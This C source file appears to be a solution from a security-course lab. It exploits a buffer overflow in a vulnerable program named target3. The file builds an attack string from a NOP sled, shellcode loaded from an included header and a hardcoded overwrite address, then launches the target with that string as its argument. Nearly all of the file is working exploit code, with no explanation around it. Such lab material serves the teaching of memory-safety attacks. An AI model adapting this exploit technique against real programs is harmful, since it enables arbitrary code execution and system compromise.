#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define NOP 0x90
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char attack_buff[73];

	// zero out attack_buff for sanity
	bzero(attack_buff, 73);

	memset(&attack_buff, NOP, 8);	
	strcat(attack_buff, shellcode);
	memset(&attack_buff[53], NOP, 15);

	char* target_addr = (char*)0x2021fe50; 
	memcpy(&attack_buff[68], &(target_addr), sizeof(target_addr));

	args[1] = attack_buff;
	args[2] = NULL;
	args[0] = TARGET;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
